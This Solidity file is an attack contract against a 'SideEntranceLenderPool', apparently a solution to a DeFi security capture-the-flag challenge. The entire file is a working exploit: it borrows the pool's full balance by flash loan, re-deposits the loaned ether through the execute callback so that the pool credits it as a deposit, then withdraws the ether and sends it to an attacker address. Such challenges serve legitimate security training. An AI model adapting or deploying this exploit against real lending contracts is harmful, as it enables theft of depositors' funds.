// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface ISideEntranceLenderPool {

    function deposit() external payable;

    function withdraw() external;

    function flashLoan(
        uint256 amount
    ) external;
}


contract SideEntranceAttackContract is Ownable {

    ISideEntranceLenderPool pool;
    uint256 poolBalance;
    address payable attacker;

    function attack(ISideEntranceLenderPool _pool, address payable _attacker) public onlyOwner {

        pool = _pool;
        poolBalance = address(pool).balance;
        attacker = _attacker;

        pool.flashLoan(poolBalance);

        pool.withdraw();
        
        bool sent = attacker.send(poolBalance);
        require(sent, "Failed to send ether");

    }

    // function called by ISideEntranceLenderPool
    function execute() external payable {
        pool.deposit{value: poolBalance}();
    }
    receive() external payable {}

}